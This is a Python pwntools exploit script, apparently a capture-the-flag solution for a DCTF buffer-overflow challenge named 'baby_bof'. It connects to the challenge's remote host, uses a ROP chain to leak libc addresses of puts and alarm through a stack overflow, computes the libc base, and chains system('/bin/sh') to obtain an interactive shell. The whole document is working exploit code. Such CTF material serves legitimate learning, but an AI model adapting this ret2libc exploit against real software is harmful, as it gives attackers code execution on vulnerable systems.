## ret2libc

from pwn import *
import sys

elf = ELF("./baby_bof")
rop = ROP(elf)
r = remote("dctf-chall-baby-bof.westeurope.azurecontainer.io", 7481)


## Craft our payload to leak function mem addr
buff_offset = b'A' * 18
puts = elf.plt['puts']
vuln = elf.symbols['vuln']
pop = (rop.find_gadget(['pop rdi', 'ret']))[0]
put_got = elf.got['puts']
payload = buff_offset + p64(pop) + p64(put_got) + p64(puts) + p64(vuln)
payload2 = buff_offset + p64(pop) + p64(elf.got.alarm) + p64(puts) + p64(vuln)

'''
Alternatively the above!

rop = ROP(elf)
rop.puts(elf.got.puts)
rop.main()
p.sendline(flat({ buff_offset: rop.chain() }))

'''

# Round 1

# we got the put() from global offset table!

r.sendline(payload)
r.recvuntil("i don\'t think this will work\n")
puts_mem = u64(r.recvline().rstrip(b'\n').ljust(8, b"\x00"))
print("Leaked libc address for puts:" + hex(puts_mem))

# Round 2

# elf.got.alarm
r.sendline(payload2)
r.recvuntil("i don\'t think this will work\n")
alarm = u64(r.recvline().rstrip(b'\n').ljust(8, b"\x00"))
print("Leaked libc address for alarm:" + hex(alarm))


##### SEARCH THE LIBC DATABASE FOR THE CORRECTED libc Version ####

#shell time
#--> libc6_2.31-0ubuntu9.1_amd64.so
#--> libc6_2.31-0ubuntu9.2_amd64.so


### compute the offset

libc = ELF("libc6_2.31-0ubuntu9.1_amd64.so")
libc2 = ELF("libc6_2.31-0ubuntu9.2_amd64.so")

base1 = puts_mem - libc.symbols["puts"]
base2 = puts_mem - libc2.symbols["puts"]
libc.address = base1
libc2.address = base2

binsh_addr = next(libc.search(b'/bin/sh'))
sys_addr = libc.sym["system"]
exit = libc.sym["exit"]
ret = (rop.find_gadget(['ret']))[0]
shell = buff_offset + p64(ret)+ p64(pop) +  p64(binsh_addr) + p64(sys_addr) +p64(exit)
r.sendline(shell)
r.interactive()

